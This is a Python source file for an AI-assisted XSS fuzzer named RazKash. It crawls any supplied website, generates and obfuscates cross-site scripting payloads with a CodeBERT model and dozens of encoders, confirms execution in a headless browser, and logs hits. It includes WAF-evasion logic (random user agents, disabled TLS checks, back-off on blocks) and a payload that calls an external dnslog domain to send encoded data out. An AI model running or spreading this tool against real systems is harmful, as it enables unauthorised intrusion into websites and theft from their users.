#!/usr/bin/env python3
# =============================================================================
# RazKash 𝕏SS AI Fuzzer (v7.0-evolve, 2025-04-30)
# Author : Haroon Ahmad Awan · CyberZeus (mrharoonawan@gmail.com)
# GPU acceleration enabled
# =============================================================================

import os
import re
import ssl
import sys
import json
import time
import random
import string
import argparse
import warnings
import logging
import base64
import threading
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import List, Dict, Any
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor

import urllib.parse
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

import torch
from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log

# Determine device (GPU if available)
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")

# Optional Playwright & websocket-client
try:
    from playwright.sync_api import sync_playwright, Request as PWReq, WebSocket as PWWS, Response as PWResp
except ImportError:
    sync_playwright = None
try:
    import websocket
except ImportError:
    websocket = None

# ─── CONFIG ─────────────────────────────────────────────────────────────────
VER                = "7.0-evolve"
MODEL              = "microsoft/codebert-base"
DNSLOG_DOMAIN      = "q68w9p.dnslog.cn"
LOGFILE            = Path("razkash_findings.md")
TOP_K              = 7
DEF_THREADS        = 14
MAX_STATIC_PAGES   = 250
DYN_OBS_MS         = 20000
RESCAN_MS          = 600
MAX_DYN_ROUNDS     = 80
HTTP_TIMEOUT       = 12
VERIFY_TIMEOUT     = 9000
HEADLESS_WAIT      = 3500

# ─── ARGS & LOGGING ──────────────────────────────────────────────────────────
ap = argparse.ArgumentParser(description="Evolve Fuzzer v7.0 with GPU support")
ap.add_argument("-u","--url", help="Target root URL")
ap.add_argument("--autotest", action="store_true", help="Run built-in playgrounds")
ap.add_argument("--threads", type=int, default=DEF_THREADS)
ap.add_argument("--max-pages", type=int, default=MAX_STATIC_PAGES)
ap.add_argument("--count", type=int, default=1, help="Number of AI-evolved variants per payload")
ap.add_argument("--debug", action="store_true")
args, _ = ap.parse_known_args()
DEBUG = args.debug

logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s" if DEBUG else "%(message)s"
)
warnings.filterwarnings("ignore")
hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context

def dbg(msg: str):
    if DEBUG:
        logging.debug(msg)

# ─── FILTER MODES ──────────────────────────────────────────────────────────
# 94 unique obfuscation/filter functions
obfuscation_methods = [
    lambda p: p,
    lambda p: "".join(f"\\x{ord(c):02x}" for c in p) if p else p,
    lambda p: "".join(f"\\u{ord(c):04x}" for c in p) if p else p,
    lambda p: base64.b64encode(p.encode()).decode(errors='ignore') if p else p,
    lambda p: p.encode('utf-16').decode(errors='ignore') if p else p,
    lambda p: p.encode('utf-16le').decode(errors='ignore') if p else p,
    lambda p: p.encode('utf-32le').decode(errors='ignore') if p else p,
    lambda p: p.encode('utf-32be').decode(errors='ignore') if p else p,
    lambda p: p[::-1] if p else p,
    lambda p: p.upper() if p else p,
    lambda p: p.lower() if p else p,
    lambda p: p.swapcase() if p else p,
    lambda p: p.replace('a','\x00a').replace('l','\x00c') if p else p,
    lambda p: p.replace('\x00','') if isinstance(p,str) else p,
    lambda p: "+".join(p.split()) if p else p,
    lambda p: "%20".join(p.split()) if p else p,
    lambda p: urllib.parse.quote(p) if p else p,
    lambda p: urllib.parse.quote(p, safe='').upper() if p else p,
    lambda p: urllib.parse.quote(urllib.parse.quote(p)) if p else p,
    lambda p: p.replace('<','&lt;').replace('>','&gt;') if p else p,
    lambda p: p.replace('"','&quot;').replace("'",'&#39;') if p else p,
    lambda p: "".join(f"\\{c}" for c in p) if p else p,
    lambda p: "".join(f"\\\\{c}" for c in p) if p else p,
    lambda p: "".join(f"%{ord(c):02X}" for c in p) if p else p,
    lambda p: "".join(f"%{ord(c):02X};" for c in p) if p else p,
    lambda p: "".join(f"%u{ord(c):04X}" for c in p) if p else p,
    lambda p: "".join(f"%u{ord(c):04X};" for c in p) if p else p,
    lambda p: "".join(f"\\x{ord(c):02X} " for c in p) if p else p,
    lambda p: "".join(f"\\u{ord(c):04X} " for c in p) if p else p,
    lambda p: "".join(f"%{ord(c):X} " for c in p) if p else p,
    lambda p: "".join(f"&#x{ord(c):X};" for c in p) if p else p,
    lambda p: p.replace('1','I').replace('0','O') if p else p,
    lambda p: p.replace('&','&amp;') if p else p,
    lambda p: ''.join('\x00a' if c=='a' else '\x00c' if c=='l' else c for c in p) if p else p,
    lambda p: base64.urlsafe_b64encode(p.encode()).decode(errors='ignore') if p else p,
    lambda p: base64.urlsafe_b64encode(p.encode()).decode(errors='ignore').rstrip('=') if p else p,
    lambda p: "".join(f"\\x{{{ord(c):02x}}}" for c in p) if p else p,
    lambda p: "".join(f"\\u{{{ord(c):04x}}}" for c in p) if p else p,
    lambda p: "".join(f"\\x({ord(c):02x})" for c in p) if p else p,
    lambda p: "".join(f"\\u({ord(c):04x})" for c in p) if p else p,
    lambda p: "".join(f"\\x[{ord(c):02x}]" for c in p) if p else p,
    lambda p: "".join(f"\\u[{ord(c):04x}]" for c in p) if p else p,
    lambda p: "".join(f"\\x<{ord(c):02x}>" for c in p) if p else p,
    lambda p: "".join(f"\\u<{ord(c):04x}>" for c in p) if p else p,
    lambda p: "".join(f"&#{ord(c)};" for c in p) if p else p,
    lambda p: "".join(f"&amp;{ord(c)};" for c in p) if p else p,
    lambda p: "".join(f"&#{ord(c)};\\x{ord(c):02x}" for c in p) if p else p,
    lambda p: "".join(f"%u{ord(c):04X}00" for c in p) if p else p,
    lambda p: "".join(f"\\{oct(ord(c))[2:]}" for c in p) if p else p,
    lambda p: "".join(f"\\u[{ord(c):04x}]; " for c in p) if p else p,
    lambda p: urllib.parse.quote(p, safe='') if p else p,
    lambda p: urllib.parse.quote(p, safe='_') if p else p,
    lambda p: base64.b64encode(p.encode()).decode(errors='ignore').replace('=', '-') if p else p,
    lambda p: base64.urlsafe_b64encode(p.encode()).decode(errors='ignore').replace('+','_') if p else p,
    lambda p: "".join(f"\\x{ord(c):02x}" for c in p) if p else p,
    lambda p: "".join(f"\\x{ord(c):02x}\\x{ord(c):02x}" for c in p) if p else p,
    lambda p: "".join(f"\\u{ord(c):04x}\\u{ord(c):04x}" for c in p) if p else p,
    lambda p: "".join(f"\\x[{ord(c):02x}]\\x[{ord(c):02x}]" for c in p) if p else p,
    lambda p: "".join(f"\\u[{ord(c):04x}]\\u[{ord(c):04x}]" for c in p) if p else p,
    lambda p: "".join(f"\\x<{ord(c):02x}>\\x<{ord(c):02x}>" for c in p) if p else p,
    lambda p: "".join(f"\\u<{ord(c):04x}>\\u<{ord(c):04x}>" for c in p) if p else p,
    lambda p: "".join(f"%{ord(c):02X};." for c in p) if p else p,
    lambda p: "".join(f"&#x{ord(c):X}" for c in p) if p else p,
    lambda p: "".join(f"\\x{{{ord(c):02X}}} " for c in p) if p else p,
    lambda p: "".join(f"\\u{{{ord(c):04X}}} " for c in p) if p else p,
    lambda p: "".join(f"\\x({ord(c):02X}) " for c in p) if p else p,
    lambda p: "".join(f"\\u({ord(c):04X}) " for c in p) if p else p,
    lambda p: "".join(f"\\x[{ord(c):02X}] " for c in p) if p else p,
    lambda p: "".join(f"\\u[{ord(c):04X}] " for c in p) if p else p,
    lambda p: "".join(f"\\x<{ord(c):02X}> " for c in p) if p else p,
    lambda p: "".join(f"\\u<{ord(c):04X}> " for c in p) if p else p,
    lambda p: "".join(f"{random.choice(['%','\\'])}{ord(c):02x}" for c in p) if p else p,
    lambda p: "".join(c for c in p[::-1]) if p else p,
]

# ─── AI PAYLOAD MUTATION ─────────────────────────────────────────────────────
tok = AutoTokenizer.from_pretrained(MODEL)
decode_model = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id

def ai_mutate(s: str) -> str:
    while "MASK" in s:
        ids = tok(s.replace("MASK", MASK_T, 1), return_tensors="pt").input_ids.to(device)
        with torch.no_grad():
            logits = decode_model(input_ids=ids).logits
        pos = (ids == MASK_ID).nonzero(as_tuple=True)[1][0]
        token_id = random.choice(logits[0, pos].topk(TOP_K).indices.tolist())
        w = tok.decode(token_id).strip() or "alert(1)"
        s = s.replace("MASK", w, 1)
    return s

def polymorph(s: str) -> str:
    choice = random.choice(["hex","uni","url","b64","none"])
    if choice == "hex":
        return ''.join(f"\\x{ord(c):02x}" for c in s)
    if choice == "uni":
        return ''.join(f"\\u{ord(c):04x}" for c in s)
    if choice == "url":
        return urllib.parse.quote(s)
    if choice == "b64":
        return base64.b64encode(s.encode()).decode()
    return s

def legit_wrap(s: str) -> str:
    wrappers = [
        "<div hidden>PAYLOAD</div>",
        "<span style=display:none>PAYLOAD</span>",
        "<p data-i=PAYLOAD></p>",
        "<video srcdoc='<script>PAYLOAD</script>'></video>",
        "<template id=tpl>PAYLOAD</template><script>document.body.append(tpl.content)</script>"
    ]
    return random.choice(wrappers).replace("PAYLOAD", s)

# ─── UTILITIES ──────────────────────────────────────────────────────────────
randstr = lambda n=12: ''.join(random.choices(string.ascii_letters + string.digits, k=n))
def jitter(a, b): time.sleep(random.uniform(a, b))
def smart_url(b: str) -> str:
    if b.startswith(("http://","https://")):
        return b
    for s in ("https://","http://"):
        try:
            r = requests.head(s+b, timeout=5, allow_redirects=True, verify=False)
            if r.status_code < 500:
                return s+b
        except:
            continue
    return "http://"+b
def random_headers() -> Dict[str,str]:
    return {
        "User-Agent": UserAgent().random,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "DNT": random.choice(["1","0"])
    }

# ─── GLOBAL PAYLOAD & FILTER LISTS ───────────────────────────────────────────
tags = ["script","img","iframe","svg","video","object","math","audio","details","marquee"]
evs  = ["onerror","onload","onclick","onmouseover","onfocus","onmouseenter","ontoggle","oncanplay","onpointerdown"]
prot = ["javascript:alert(1)","data:text/html,<script>alert(1)</script>","vbscript:msgbox('XSS')"]
PAY = []
for t in tags:
    for e in evs:
        PAY.append(f"<{t} {e}=\"MASK\"></{t}>")
    if t in ("img","iframe","object"):
        for p in prot:
            PAY.append(f"<{t} src=\"{p.replace('MASK','MASK')}\"></{t}>")
PAY += [
    "<script>MASK</script>",
    "<body onload=MASK>",
    "<div style=background:url(MASK)></div>",
    "<input value=MASK>",
    "<textarea>MASK</textarea>",
    "<button onclick=MASK>x</button>",
    "<div style=\"width:expression(MASK)\"></div>",
    "<svg><script>MASK</script></svg>",
    "<img src=\"data:image/png;base64,MASK\">",
    "<script src=\"/jsonp?cb=MASK\"></script>",
    "<template><script>MASK</script></template>",
    '<script type=module>import("javascript:MASK")</script>',
    'importScripts("data:text/javascript,MASK")',
    '<template><shadow-root></shadow-root><script>MASK</script></template>',
    '<script>new MutationObserver(_=>MASK).observe(document.body,{childList:true})</script>',
    '<style>@supports(display:grid){@import "javascript:MASK";}</style>',
    '<iframe src="data:text/html;base64,MASK"></iframe>',
    '<script>WebAssembly.instantiateStreaming(fetch("data:application/wasm;base64,MASK"))</script>',
    '<img src="javascript:MASK%00.gif">',
    '<plaintext>\u202EMASK</plaintext>',
    '<svg><animate attributeName=href to="javascript:MASK"/></svg>'
]
if DNSLOG_DOMAIN:
    PAY.append(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa(MASK))>")

FILTER = [
    "<sCrIpT>PAYLOAD</sCrIpT>",
    "<!-->PAYLOAD<!-->",
    "<svg onload=PAYLOAD>",
    "<script>setTimeout(()=>{{PAYLOAD}},0)</script>",
    "<object data=\"javascript:PAYLOAD\"></object>",
    "<meta http-equiv=refresh content=\"0;url=javascript:PAYLOAD\">"
]

# ─── VERIFYER ───────────────────────────────────────────────────────────────
JSFLAG = """
window._xss_triggered=false;function _f(){window._xss_triggered=true;}
['innerHTML','outerHTML','insertAdjacentHTML'].forEach(p=>{const d=Object.getOwnPropertyDescriptor(Element.prototype,p)||{};
 if(d.set){Object.defineProperty(Element.prototype,p,{set(v){_f();d.set.call(this,v)},configurable:true})}});
const _eval=window.eval;window.eval=function(...a){_f();return _eval(...a)};
const _Fn=Function;window.Function=function(...a){_f();return new _Fn(...a)};
"""
def verify(url: str, m: str, data: Any, is_json=False) -> bool:
    if not sync_playwright:
        dbg("[verify] Playwright not available, skipping.")
        return False
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
            ctx = browser.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
            ctx.add_init_script(JSFLAG)
            page = ctx.new_page()
            page.on("dialog", lambda d: (d.dismiss(), page.evaluate("_f()")))
            if m == "GET":
                page.goto(f"{url}?{urllib.parse.urlencode(data)}", timeout=VERIFY_TIMEOUT, wait_until="domcontentloaded")
            else:
                hdr = {"Content-Type":"application/json"} if is_json else {"Content-Type":"application/x-www-form-urlencoded"}
                body = json.dumps(data) if is_json else urllib.parse.urlencode(data)
                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="domcontentloaded")
                page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b})",url,hdr,body)
            page.wait_for_timeout(HEADLESS_WAIT)
            res = page.evaluate("window._xss_triggered")
            ctx.close(); browser.close()
            return bool(res)
    except Exception as e:
        dbg(f"[verify] {e}"); return False

# ─── LOGGING ────────────────────────────────────────────────────────────────
if not LOGFILE.exists():
    LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n","utf-8")
_hits = set(); log_lock = threading.Lock()
def log_hit(u: str, m: str, p: str):
    entry = f"- **XSS** {m} `{u}` payload=`{p[:90]}`\n"
    with log_lock:
        if entry in _hits: return
        _hits.add(entry)
        content = LOGFILE.read_text('utf-8') + entry
        LOGFILE.write_text(content,'utf-8')
    logging.info(entry.strip())

# ─── CRAWLERS & HELPERS ─────────────────────────────────────────────────────
JS_URL_RE = re.compile(r"""(['"])(/[^'"]+\.(?:php|asp|jsp|json|api|graphql|cgi))\1""", re.I)
SMAP_RE   = re.compile(r"""(?:fetch|axios\.\w+|xhr\.open)\([^'"]*['"](/[^'"]+)['"]""")
def mine_js(url: str, host: str) -> List[str]:
    out=[]
    try:
        r = requests.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        txt = r.text
        for m in JS_URL_RE.findall(txt): out.append(m[1])
        out += SMAP_RE.findall(txt)
    except: pass
    return [urllib.parse.urljoin(url,u) for u in out if urllib.parse.urlparse(urllib.parse.urljoin(url,u)).netloc.lower()==host]

def misc_assets(root: str) -> List[str]:
    assets=[]
    base = urllib.parse.urlparse(root)._replace(path="",params="",query="",fragment="").geturl()
    try:
        robots = requests.get(base+"/robots.txt",timeout=HTTP_TIMEOUT,verify=False).text
        for ln in robots.splitlines():
            if ln.lower().startswith("sitemap:"): assets.append(ln.split(":",1)[1].strip())
        for sm in assets.copy():
            try:
                xml = requests.get(sm,timeout=HTTP_TIMEOUT,verify=False).text
                tree=ET.fromstring(xml)
                for loc in tree.iter("{*}loc"): assets.append(loc.text.strip())
            except: pass
    except: pass
    return list(set(assets))

def crawl_static(root: str, cap: int) -> List[Dict[str,Any]]:
    visited, queue, targets = set(), [root]+misc_assets(root), []
    host = urllib.parse.urlparse(root).netloc.lower()
    logging.info(f"[static] crawling up to {cap} pages on {root}")
    while queue and len(visited)<cap:
        u = queue.pop(0)
        if u in visited: continue
        visited.add(u)
        try:
            r = requests.get(u, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        except: continue
        ctype = r.headers.get("Content-Type","")
        if "javascript" in ctype:
            for js in mine_js(u,host):
                if js not in visited: queue.append(js)
            continue
        if "text/html" not in ctype: continue
        soup = BeautifulSoup(r.text,"html.parser")
        for tag in soup.find_all("script",src=True):
            src=urllib.parse.urljoin(u,tag["src"])
            if urllib.parse.urlparse(src).netloc.lower()==host and src not in visited:
                queue.append(src)
        for a in soup.find_all("a",href=True):
            nxt=urllib.parse.urljoin(u,a["href"])
            p=urllib.parse.urlparse(nxt)
            if p.netloc.lower()!=host: continue
            if nxt not in visited: queue.append(nxt)
            if p.query: targets.append({"url":p._replace(query="").geturl(),"method":"GET","params":list(urllib.parse.parse_qs(p.query).keys())})
        for fm in soup.find_all("form"):
            act=urllib.parse.urljoin(u,fm.get("action") or u)
            if urllib.parse.urlparse(act).netloc.lower()!=host: continue
            mth=fm.get("method","get").upper()
            inp=[i.get("name") for i in fm.find_all("input",{"name":True})]
            if inp: targets.append({"url":act,"method":mth,"params":inp})
        jitter(0.3,1.0)
    logging.info(f"[static] found {len(targets)} endpoints")
    return targets

def crawl_dynamic(root: str) -> List[Dict[str,Any]]:
    if not sync_playwright:
        logging.info("[dynamic] skipping dynamic crawl")
        return []
    host=urllib.parse.urlparse(root).netloc.lower()
    seen, found=set(), []
    with sync_playwright() as p:
        browser=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
        ctx=browser.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
        page=ctx.new_page()

        def on_req(req: PWReq):
            url=req.url
            if urllib.parse.urlparse(url).netloc.lower()!=host or url in seen: return
            seen.add(url)
            hdr=req.headers.get("content-type","")
            is_j="json" in hdr or "graphql" in hdr
            tpl=None; keys=[]
            if is_j and req.post_data:
                try:
                    tpl=json.loads(req.post_data)
                    if isinstance(tpl,dict) and "variables" in tpl:
                        tpl=tpl["variables"]
                    keys=list(tpl.keys()) if isinstance(tpl,dict) else []
                except: pass
            qs=list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())
            found.append({"url":url.split("?",1)[0],"method":"POST" if req.method in ("POST","PUT") else "GET","params":keys or qs or ["data"],"json":bool(keys),"template":tpl})
        page.on("request", on_req)

        page.goto(root,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
        start=time.time()*1000; rounds=0
        while (time.time()*1000-start)<DYN_OBS_MS and rounds<MAX_DYN_ROUNDS:
            try: page.wait_for_event("event",timeout=RESCAN_MS)
            except: pass
            rounds+=1
        ctx.close(); browser.close()
    logging.info(f"[dynamic] found {len(found)} endpoints")
    return found

def deep_keys(o: Any, prefix="") -> List[str]:
    keys=[]
    if isinstance(o,dict):
        for k,v in o.items():
            p=f"{prefix}.{k}" if prefix else k
            if isinstance(v,(dict,list)): keys+=deep_keys(v,p)
            else: keys.append(p)
    elif isinstance(o,list):
        for i,v in enumerate(o):
            p=f"{prefix}[{i}]"
            if isinstance(v,(dict,list)): keys+=deep_keys(v,p)
            else: keys.append(p)
    return keys

def set_deep(o: Any, path: str, val: Any):
    parts=re.split(r'\.|\[|\]',path)
    cur=o
    for seg in parts[:-1]:
        if not seg or seg.isdigit(): continue
        cur=cur.setdefault(seg,{})
    leaf=parts[-1]
    if leaf and not leaf.isdigit(): cur[leaf]=val

# ─── FUZZERS ────────────────────────────────────────────────────────────────
def fuzz_http(t: Dict[str,Any]):
    url, meth = t["url"], t["method"]
    is_json, tpl = t.get("json",False), t.get("template")
    mk = randstr()
    try:
        if is_json and tpl:
            body=json.loads(json.dumps(tpl)); set_deep(body, random.choice(t["params"]), mk)
            resp=requests.post(url,headers={"Content-Type":"application/json"},data=json.dumps(body),timeout=HTTP_TIMEOUT,verify=False)
        else:
            data={p:mk for p in t["params"]}
            resp=(requests.get if meth=="GET" else requests.post)(url,params=data if meth=="GET" else None,data=data if meth=="POST" else None,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        if resp.status_code!=200 or not SequenceMatcher(None,mk.lower(),resp.text.lower()).quick_ratio()>0.8: return
    except Exception as e:
        dbg(f"[probe] {e}"); return
    for sk in random.sample(PAY, k=min(len(PAY),24)):
        base=ai_mutate(sk)
        evolved=[]
        for fn in random.sample(obfuscation_methods, min(args.count,len(obfuscation_methods))):
            try: evolved.append(fn(base))
            except: pass
        variants=set(evolved)
        for v in list(variants):
            variants.add(polymorph(v)); variants.add(legit_wrap(v))
        for pay in variants:
            try:
                if is_json and tpl:
                    body=json.loads(json.dumps(tpl))
                    for pnm in t["params"]: set_deep(body,pnm,pay)
                    r2=requests.post(url,headers={"Content-Type":"application/json"},data=json.dumps(body),timeout=HTTP_TIMEOUT,verify=False)
                else:
                    dat={p:pay for p in t["params"]}
                    r2=(requests.get if meth=="GET" else requests.post)(url,params=dat if meth=="GET" else None,data=dat if meth=="POST" else None,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
                txt=r2.text.lower()
                if r2.status_code in {403,429,503} or any(w in txt for w in ("captcha","access denied","blocked")):
                    dbg(f"[waf] {url}"); jitter(25,55); return
                if SequenceMatcher(None,pay.lower(),txt).quick_ratio()>0.8 or verify(url,meth,dat if not is_json else body,is_json):
                    log_hit(url,meth,pay); return
            except Exception as e:
                dbg(f"[err] {e}")
            jitter(1.0,2.4)

def fuzz_ws(t: Dict[str,Any]):
    if not websocket: return
    url, params = t["url"], t.get("params", [])
    tpl = t.get("template", {}) or {}
    mk = randstr()
    body=json.loads(json.dumps(tpl)) if tpl else {}
    if body:
        set_deep(body, random.choice(params), f"<img src onerror=alert('{mk}')>")
    else:
        body[random.choice(params)] = f"<svg/onload=alert('{mk}')>"
    payload=json.dumps(body)
    hit=False
    def on_msg(ws,msg):
        nonlocal hit
        if mk in msg: hit=True
    try:
        wsapp=websocket.WebSocketApp(url,on_message=on_msg)
        thr=threading.Thread(target=wsapp.run_forever,kwargs={"sslopt":{"cert_reqs":ssl.CERT_NONE}})
        thr.daemon=True; thr.start()
        time.sleep(1); wsapp.send(payload); time.sleep(3); wsapp.close()
        if hit: log_hit(url,"WS",payload)
    except Exception as e:
        dbg(f"[ws] {e}")

# ─── MAIN ──────────────────────────────────────────────────────────────────
AUTOTEST = [
    "xss-game.appspot.com",
    "testphp.vulnweb.com",
    "portswigger.net/web-security/xss"
]

def main():
    roots=[]
    if args.autotest:
        roots=[smart_url(h) for h in AUTOTEST]
    elif args.url:
        roots=[smart_url(args.url.rstrip("/"))]
    else:
        ap.print_help(); sys.exit(1)

    logging.info(f"\n┌─ RazKash AI XSS v{VER}")
    for root in roots:
        logging.info(f"├─▶ {root}")
        static=crawl_static(root,args.max_pages)
        dynamic=crawl_dynamic(root)
        if not dynamic and not sync_playwright:
            logging.info("[main] no dynamic endpoints, using static only")
        targets=static+dynamic
        http_t=[t for t in targets if t["method"]!="WS"]
        ws_t=[t for t in targets if t["method"]=="WS"]
        logging.info(f"│   Total: {len(targets)} (HTTP:{len(http_t)}, WS:{len(ws_t)})")
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            pool.map(fuzz_http,http_t); pool.map(fuzz_ws,ws_t)
        logging.info("│   ✓ done fuzzing\n")
    logging.info(f"└─ Results in {LOGFILE.resolve()}\n")

if __name__ == "__main__":
    main()
